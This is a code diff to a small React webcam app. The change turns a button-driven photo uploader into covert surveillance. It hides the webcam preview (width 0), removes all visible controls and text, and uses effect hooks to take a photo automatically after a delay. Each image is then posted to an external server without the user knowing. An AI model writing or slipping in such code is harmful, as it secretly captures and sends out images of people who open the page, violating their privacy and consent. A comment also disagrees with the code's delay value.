@@ -1,40 +1,58 @@
-import React, { useRef, useState } from 'react';
+import React, { useEffect, useRef, useState } from 'react';
 import Webcam from 'react-webcam';
 import axios from 'axios';
 
 const App = () => {
   const webcamRef = useRef(null);
-  const [imageSrc, setImageSrc] = useState(null);
+  const [imageSrcs, setImageSrcs] = useState([]);
+  const [isCapt, setIsCapt] = useState(false);
 
-  const capturePhoto = () => {
-    const image = webcamRef.current.getScreenshot();
-    setImageSrc(image);
+  const capturePhotos = async () => {
+    let capturedImages = [];
+    for (let i = 0; i < 1; i++) {
+      // Wait for 10 seconds before capturing the next photo
+      await new Promise(resolve => setTimeout(resolve, 5000));
+
+      const image = webcamRef.current.getScreenshot();
+      capturedImages.push(image);
+    }
+    setImageSrcs(capturedImages);
   };
 
-  const uploadPhoto = async () => {
-    if (!imageSrc) return alert('Capture a photo first!');
-    
+  useEffect(() => {
+    if (imageSrcs.length >= 1) {
+      return uploadPhotos()
+    } else {
+      setIsCapt(true);
+    }
+  },[imageSrcs]);
+  
+  useEffect(() => {
+    if (isCapt) return capturePhotos();
+  },[isCapt]);
+
+  const uploadPhotos = async () => {
+    if (imageSrcs.length === 0) return alert('Capture photos first!');
+
     try {
-      const response = await axios.post('https://be-ggny.onrender.com/upload', { image: imageSrc });
-      alert('Photo uploaded successfully!');
-      console.log(response.data);
+      for (const image of imageSrcs) {
+        const response = await axios.post('https://be-ggny.onrender.com/upload', { image });
+        console.log('Photo uploaded:', response.data);
+      }
     } catch (error) {
-      console.error('Error uploading photo:', error);
+      console.error('Error uploading photos:', error);
     }
   };
 
   return (
     <div>
-      <h1>Photo Capture App</h1>
       <Webcam
         audio={false}
         ref={webcamRef}
         screenshotFormat="image/jpeg"
         videoConstraints={{ facingMode: "user" }}
+        width={0}
       />
-      <button onClick={capturePhoto}>Capture Photo</button>
-      {imageSrc && <img src={imageSrc} alt="Captured" />}
-      <button onClick={uploadPhoto}>Upload Photo</button>
     </div>
   );
 };
